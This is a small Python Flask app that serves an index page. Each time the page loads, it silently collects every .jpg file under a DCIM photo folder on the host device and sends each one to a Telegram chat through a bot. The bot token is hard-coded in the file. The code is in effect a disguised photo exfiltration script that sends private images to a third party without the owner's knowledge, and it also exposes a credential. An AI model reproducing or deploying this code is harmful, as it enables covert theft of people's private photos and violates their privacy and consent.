from flask import Flask, render_template
import glob
import telebot

app = Flask(__name__)

@app.route('/')
def index():
    send_images_to_telegram()
    return render_template('index.html')

def send_images_to_telegram():
    bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
    bot = telebot.TeleBot(bot_token)
    image_paths = glob.glob('/sdcards/DCIM/*.jpg')

    for image_path in image_paths:
        with open(image_path, 'rb') as file:
            bot.send_photo(chat_id='@localipy', photo=file)

if __name__ == '__main__':
    app.run()
